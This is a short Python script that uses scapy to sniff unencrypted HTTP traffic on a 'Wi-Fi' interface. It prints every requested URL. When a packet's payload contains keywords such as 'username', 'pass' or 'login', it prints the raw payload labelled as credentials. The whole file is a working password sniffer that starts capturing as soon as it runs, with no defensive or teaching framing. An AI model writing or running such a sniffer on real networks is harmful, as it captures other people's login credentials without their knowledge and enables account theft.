import scapy.all as scapy
from scapy.layers import http

def sniff(target):
    scapy.sniff(iface = target, store = False, prn=PacketFilter)

def PacketFilter(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("URL is: {}".format(url))
        cred = get_cred(packet)
        if cred:
            print("These are the credentials: {}".format(cred))
def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode('utf-8') if packet[http.HTTPRequest].Host else ""
    path = packet[http.HTTPRequest].Path.decode('utf-8') if hasattr(packet[http.HTTPRequest], "Path") else ""
    return host + path

def get_cred(packet):
    keywords=('username','user','name','pass','password','login','signup','passw')
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load

sniff('Wi-Fi')
